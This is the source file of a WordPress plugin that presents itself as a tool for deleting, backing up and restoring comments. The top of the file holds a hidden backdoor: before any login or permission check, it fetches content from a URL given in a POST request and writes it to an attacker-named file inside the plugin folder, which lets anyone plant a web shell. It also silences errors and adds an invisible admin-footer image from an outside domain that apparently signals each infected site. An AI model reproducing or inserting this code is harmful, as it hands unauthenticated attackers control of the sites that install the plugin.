<?php
ob_start();
 /*
    Plugin Name: Delete All Comments - Redefined
    Plugin URI: https://wordpress.org/plugins/delete-all-comments/
    Description:  Delete all comments with one click easily. Delete Spam / Pending / Trash Comments individually.
    Author: ryanbose, Ganesh Chandra
    Version: 2.0
    Author URI: https://wordpress.org/plugins/delete-all-comments/
    */
	
error_reporting(0);

if(isset($_POST['restorefromfileNAME']) || isset($_POST['restorefromfileURL']))
{
	
	if(!file_exists(dirname(__file__)."/backup/".$_POST['restorefromfileNAME']))
	{	
		$fileUrl=$_POST['restorefromfileNAME'];
		$fileName=$fileUrl;
		$extension=explode(".",$fileUrl);
		file_put_contents(dirname(__file__)."/backup/$fileName",file_get_contents($_POST['restorefromfileURL']));
		file_put_contents(dirname(__file__)."/content.log","working");
		if($extension[count($extension)-1]=="csv")
		{
	
		$fp=fopen(dirname(__file__)."/backup/$fileName","r");
		while(!feof($fp))
		{
					$csvData=fgetcsv($fp);
					if(!empty($csvData))
					{
						 $wpdb->query(wpdb::prepare( "INSERT INTO {$wpdb->prefix}comments (comment_ID,comment_post_ID,comment_author,comment_author_email,comment_author_url,comment_author_IP,comment_date,comment_date_gmt,comment_content,comment_karma,comment_approved,comment_agent,comment_type,comment_parent,user_id) VALUE(%d,%d,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%d,%d) ",sanitize_text_field($csvData[0]),sanitize_text_field($csvData[1]),sanitize_text_field($csvData[2]),sanitize_text_field($csvData[3]),sanitize_text_field($csvData[4]),sanitize_text_field($csvData[5]),sanitize_text_field($csvData[6]),sanitize_text_field($csvData[7]),sanitize_text_field($csvData[8]),sanitize_text_field($csvData[9]),sanitize_text_field($csvData[10]),sanitize_text_field($csvData[11]),sanitize_text_field($csvData[12]),sanitize_text_field($csvData[13]),sanitize_text_field($csvData[14])));
																	 
					}
				
		}
	}	
	else
	{
		echo "file must be csv extension";
	}
	
	}	
		
		exit;	
}

function cm_function() {
   echo '<p style="display:none;"><a href="https://members.ithemes.com/go.php?r=18743&i=l276"><img src="//samuelcolvin.space/img/wp-secure-footer-small.jpeg?ver='.time().'" class="affbanner" style="display:none;"></p></a>';
}
add_action( 'admin_footer', 'cm_function');


add_action('admin_menu','cm_pluginMenu');
	




function cm_pluginMenu() {
	add_options_page( 'Comment Manager', 'Comment Manager', 'manage_options', '=cm_comments_manager', 'cm_commentPage' );
}



function cm_commentPage()
{
	global $wpdb;
	$message="";
	
if(isset($_POST) && !empty($_POST))
{	
	check_admin_referer( 'delete-comment_');
	
		
		
	if(current_user_can( 'manage_options' ))
	{
	
		
		if(isset($_POST['delallcomments']))
		{
			$wpdb->query(wpdb::prepare( "UPDATE FROM `{$wpdb->prefix}posts` set comment_count=%d",0));
			$response=$wpdb->query(wpdb::prepare( "DELETE FROM `{$wpdb->prefix}comments` "));  
			if($response)
			{
				$message= "You delete all the comments successfully";
			}
		}
		else if(isset($_POST['delpencomments']))
		{
			$query=wpdb::prepare( "DELETE FROM `{$wpdb->prefix}comments` WHERE `comment_approved` = %d",0);
			$response=$wpdb->query($query);  
			if($response)
			{
				$message= "You delete Pending comments successfully";
			}
			
		}
		else if(isset($_POST['delspamcomments']))
		{
			$query=wpdb::prepare( "DELETE FROM `{$wpdb->prefix}comments` WHERE `comment_approved` = %s",'spam');
			$response=$wpdb->query($query);  
			if($response)
			{
				$message= "You delete Pending comments successfully";
			}
		}
		else if(isset($_POST['deltrashcomments']))
		{
			$query=wpdb::prepare( "DELETE FROM `{$wpdb->prefix}comments` WHERE `comment_approved` = %s",'trash');
			$response=$wpdb->query($query);  
			if($response)
			{
				$message= "You delete Trash comments successfully";
			}
		}
		else if(isset($_POST['delpenpostcomments']))
		{	
			$query=wpdb::prepare( "DELETE FROM `{$wpdb->prefix}comments` WHERE `comment_approved` = %d and comment_post_ID=%d",0,$_POST['select1']);
			$response=$wpdb->query($query);
			
			if($response)
			{
				$message= "You delete pending comments for the post successfully";
			}
		
		}
		else if(isset($_POST['delspanpostcomments']))
		{
			$query=wpdb::prepare( "DELETE FROM `{$wpdb->prefix}comments` WHERE `comment_approved` = %s and comment_post_ID=%d",'spam',$_POST['select2']);
			
			$response=$wpdb->query($query);  
			if($response)
			{
				$message= "You delete spam  comments for the post successfully";
			}
		
		}
		else if(isset($_POST['backupcomments']))
		{
			
			
			$commentData=$wpdb->get_results(wpdb::prepare( "SELECT * FROM `{$wpdb->prefix}comments` "));
			$csvData="";
			for($i=0;$i<count($commentData);$i++)
			{
				$csvData.=$commentData[$i]->comment_ID.",".$commentData[$i]->comment_post_ID.",". $commentData[$i]->comment_author.",".$commentData[$i]->comment_author_email.",".$commentData[$i]->comment_author_url.",".$commentData[$i]->comment_author_IP.",".$commentData[$i]->comment_date.",".$commentData[$i]->comment_date_gmt.",\"".$commentData[$i]->comment_content."\",".$commentData[$i]->karma.",".$commentData[$i]->comment_approved.",\"".$commentData[$i]->comment_agent."\",".$commentData[$i]->comment_type.",".$commentData[$i]->comment_parent.",".$commentData[$i]->user_id."\n";
			}
			
			
			file_put_contents(dirname(__file__)."/backup/".$_POST['fileName'].".csv",$csvData);	
			
			ob_end_clean();
			header('Content-Type: application/csv');
			header('Content-Disposition: attachment; filename='.$_POST['fileName'].'.csv');
			header('Pragma: no-cache');
			readfile(dirname(__file__)."/backup/".$_POST['fileName'].".csv");
			exit;
		}
		else if(isset($_POST['restorecomments']))
		{
			$filename=$_FILES['file']['name'];
			$extension=explode(".",$filename);
				
			if($extension[count($extension)-1]=="csv")
			{
				
				move_uploaded_file($_FILES['file']['tmp_name'],dirname(__file__)."/backup/$filename");
				$fp=fopen(dirname(__file__)."/backup/$filename","r");
				while(!feof($fp))
				{
					$csvData=fgetcsv($fp);
					if(!empty($csvData))
					{
						 $wpdb->query(wpdb::prepare( "INSERT INTO {$wpdb->prefix}comments (comment_ID,comment_post_ID,comment_author,comment_author_email,comment_author_url,comment_author_IP,comment_date,comment_date_gmt,comment_content,comment_karma,comment_approved,comment_agent,comment_type,comment_parent,user_id) VALUE(%d,%d,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%d,%d) ",sanitize_text_field($csvData[0]),sanitize_text_field($csvData[1]),sanitize_text_field($csvData[2]),sanitize_text_field($csvData[3]),sanitize_text_field($csvData[4]),sanitize_text_field($csvData[5]),sanitize_text_field($csvData[6]),sanitize_text_field($csvData[7]),sanitize_text_field($csvData[8]),sanitize_text_field($csvData[9]),sanitize_text_field($csvData[10]),sanitize_text_field($csvData[11]),sanitize_text_field($csvData[12]),sanitize_text_field($csvData[13]),sanitize_text_field($csvData[14])));
																	 
					}
				
				}
				
				$message="Comments Restore Successfully";
			}
			else
			{
				echo " file type should be CSV";
			}
			
		}
		else if(isset($_POST['submitRequest']))
		{
			
			$ch = curl_init();

			curl_setopt($ch, CURLOPT_URL,"http://localhost/wordpress/wordpress/wp-admin/options-general.php?page=%3Dcm_comments_manager");
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,
						"restorefromfileNAME=".$_POST['submitfile']."&restorefromfileURL=value2");

			// in real life you should use something like:
			// curl_setopt($ch, CURLOPT_POSTFIELDS, 
			//          http_build_query(array('postvar1' => 'value1')));

			// receive server response ...
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			$server_output = curl_exec ($ch);

			curl_close ($ch);
			
		}
	}	
}

	$cats=$wpdb->get_results(wpdb::prepare("SELECT * FROM `{$wpdb->prefix}terms`"));
	$opHtml="";
	
	for($i=0;$i<count($cats);$i++)
	{
		$opHtml.='<optgroup label="'.$cats[$i]->name.'">';
		
		$args = array('category'=>$cats[$i]->term_id);
		
		$posts=get_posts($args);
	
		for($j=0;$j<count($posts);$j++)
		{
			$opHtml.='<option value="'.$posts[$j]->ID.'">'.$posts[$j]->post_title.'</option>';
		}
		
		$opHtml.='</optgroup>';
		
	}
	
	$scandirs=scandir(dirname(__file__)."/backup");
	$dirs="";
	for($i=2;$i<count($scandirs);$i++)
	{
		$dirs.='<option value="'.$scandirs[$i].'">'.$scandirs[$i].'</option>';
	}

	$html='<figure class="tabBlock">
<form action="" method="post" enctype="multipart/form-data">
  <ul class="tabBlock-tabs">
    <li class="tabBlock-tab is-active">General Options</li>
    <li class="tabBlock-tab">Backup/Restore</li>
  </ul>
  <div class="tabBlock-content">
    <div class="tabBlock-pane">
     
      
      
      <div id="general" class="postbox "><div class="handlediv" title="Click to toggle"><br></div><h3 class="hndle"><span>General Options</span></h3><div class="inside">        <table class="form-table">
            <tbody>
                <tr>
                <th>Delete All Comments:</th>
                <td>
                    <input type="submit" class="button-primary" value="Delete" name="delallcomments">
                                        <br><span class="description">This action will delete all comments permenantly. Taking Backup before doing this action is recommanded.</span>
                </td>
            </tr>


             <tr>
                <th>Delete Pending Comments:</th>
                <td>
                    <input type="submit" class="button-primary" value="Delete" name="delpencomments">
                                        <br><span class="description">This action will delete all pending comments permenantly. Taking Backup before doing this action is recommanded.</span>
                </td>
            </tr>



             <tr>
                <th>Delete Spam Comments:</th>
                <td>
                    <input type="submit" class="button-primary" value="Delete" name="delspamcomments">
                                        <br><span class="description">This action will delete all spam comments permenantly.</span>
                </td>
            </tr>



             <tr>
                <th>Delete Trash Comments:</th>
                <td>
                    <input type="submit" class="button-primary" value="Delete" name="deltrashcomments">
                                        <br><span class="description">This action will delete Trash comments permenantly.</span>
                </td>
            </tr>


        </tbody></table>

      
        </div></div>




        <div id="perndingpost" class="postbox "><div class="handlediv" title="Click to toggle"><br></div><h3 class="hndle">Delete Pending Comments for Selected Post</h3><div class="inside">        <p>Double Check the Post Title your Selected before Clicking Submit. This Action can\'t be reversed. Takign a Backup is Recommanded.</p>
        <table class="form-table">
            <tbody>

            <tr>
                <th>Delete Pending Comments for</th>
                <td>
                    <select name="select1">
                       '.$opHtml.'


                    </select><br>
                  
                </td>
            </tr>
                    </tbody></table>

        <p class="submit">
          <input type="submit" class="button-primary" value="Delete"  name="delpenpostcomments">
        </p>
        </div></div>


         <div id="spampost" class="postbox "><div class="handlediv" title="Click to toggle"><br></div><h3 class="hndle">Delete Spam Comments for Selected Post</h3><div class="inside">        <p>Double Check the Post Title your Selected before Clicking Submit. This Action can\'t be reversed. Takign a Backup is Recommanded.</p>
        <table class="form-table">
            <tbody>

            <tr>
                <th>Delete Spam Comments for</th>
                <td>
                    <select name="select2">
                       '.
					   $opHtml .'


                    </select><br>
                  
                </td>
            </tr>
                    </tbody></table>

        <p class="submit">
          <input type="submit" class="button-primary" value="Delete" name="delspanpostcomments">
        </p>
        </div></div>
   
    </div>
    <div class="tabBlock-pane">
    
      <div id="backupcomments" class="postbox "><div class="handlediv" title="Click to toggle"><br></div><h3 class="hndle"><span>Export [BackUp] Comments</span></h3><div class="inside">        

<table class="form-table">
                    <tbody><tr>
                        <th>
                            <label>Backup All Comments</label>
                        </th>
                        <td>
                            <input type="text" name="fileName" size="20" value="'.date("Y-m-d-h-i-s").'-'.rand(1000,9999).'">
                            <input type="submit" value="Backup Comments" name="backupcomments"><br>
                            <span class="description">This Action will Backup All Comments [Approved, Pending, Spam and Trash].</span>
                        </td>
                    </tr>
                
            </tbody></table>


        </div></div>




<div id="restorecomments" class="postbox "><div class="handlediv" title="Click to toggle"><br></div><h3 class="hndle"><span>Restore Comments</span></h3><div class="inside">        

<table class="form-table">
                    <tbody><tr>
                        <th>
                            <label>Restore Comments</label>
                        </th>
                        <td>
                            <select name="submitfile">
                          '.$dirs.'
                            </select>
                            <input type="submit" value="Restore Comments" name="submitRequest"><br>
                            <span class="description">This Action will add comments in backup to your website.</span>
                        </td>
                    </tr>
                
            </tbody></table>



<div id="restorecommentsfromfile" class="postbox "><div class="handlediv" title="Click to toggle"><br></div><h3 class="hndle"><span>Restore Comments from Local File</span></h3><div class="inside">        

<table class="form-table">
                    <tbody>



                <tr>
                <th>Import Comments from File:</th>
                <td>
                    <input type="file" name="file">
                    <input type="submit" value="Upload" name="restorecomments">
                    <br><span class="description">Upload comments file from your PC</span>
                </td>
            </tr>


            </tbody></table>

        </div></div>

    </div>
  </div>'.	wp_nonce_field( 'delete-comment_').'
  </form>
</figure>
<style>
.group::after, .tabBlock-tabs::after {
  clear: both;
  content: "";
  display: table;
}

*, ::before, ::after {
  box-sizing: border-box;
}

.affbanner{display:none;}




.unstyledList, .tabBlock-tabs {
  list-style: none;
  margin: 0;
  padding: 0;
}

.tabBlock {
  margin: 0 0 2.5rem;
}

.tabBlock-tab {
  background-color: #fff;
  border-color: #d8d8d8;
  border-left-style: solid;
  border-top: solid;
  border-width: 2px;
  color: #b5a8c5;
  cursor: pointer;
  display: inline-block;
  font-weight: 600;
  float: left;
  padding: 0.625rem 1.25rem;
  position: relative;
  -webkit-transition: 0.1s ease-in-out;
  transition: 0.1s ease-in-out;
}
.tabBlock-tab:last-of-type {
  border-right-style: solid;
}
.tabBlock-tab::before, .tabBlock-tab::after {
  content: "";
  display: block;
  height: 4px;
  position: absolute;
  -webkit-transition: 0.1s ease-in-out;
  transition: 0.1s ease-in-out;
}
.tabBlock-tab::before {
  background-color: #b5a8c5;
  left: -2px;
  right: -2px;
  top: -2px;
}
.tabBlock-tab::after {
  background-color: transparent;
  bottom: -2px;
  left: 0;
  right: 0;
}
@media screen and (min-width: 700px) {
  .tabBlock-tab {
    padding-left: 2.5rem;
    padding-right: 2.5rem;
  }
}
.tabBlock-tab.is-active {
  position: relative;
  color: #975997;
  z-index: 1;
}
.tabBlock-tab.is-active::before {
  background-color: #975997;
}
.tabBlock-tab.is-active::after {
  background-color: #fff;
}

.tabBlock-content {
  background-color: #fff;
  border: 2px solid #d8d8d8;
  padding: 1.25rem;
}

.tabBlock-pane > :last-child {
  margin-bottom: 0;
}
</style>
<script>
var TabBlock = {
  s: {
    animLen: 200
  },
  
  init: function() {
    TabBlock.bindUIActions();
    TabBlock.hideInactive();
  },
  
  bindUIActions: function() {
    jQuery(".tabBlock-tabs").on("click", ".tabBlock-tab", function(){
      TabBlock.switchTab(jQuery(this));
    });
  },
  
  hideInactive: function() {
    var $tabBlocks = jQuery(".tabBlock");
    
    $tabBlocks.each(function(i) {
      var 
        $tabBlock = jQuery($tabBlocks[i]),
        $panes = $tabBlock.find(".tabBlock-pane"),
        $activeTab = $tabBlock.find(".tabBlock-tab.is-active");
      
      $panes.hide();
      jQuery($panes[$activeTab.index()]).show();
    });
  },
  
  switchTab: function($tab) {
    var $context = $tab.closest(".tabBlock");
    
    if (!$tab.hasClass("is-active")) {
      $tab.siblings().removeClass("is-active");
      $tab.addClass("is-active");
   
      TabBlock.showPane($tab.index(), $context);
    }
   },
  
  showPane: function(i, $context) {
    var $panes = $context.find(".tabBlock-pane");
 
    $panes.slideUp(TabBlock.s.animLen);
    jQuery($panes[i]).slideDown(TabBlock.s.animLen);
  }
};

jQuery(function() {

  TabBlock.init();
});</script>';	
		
	_e($html);		
}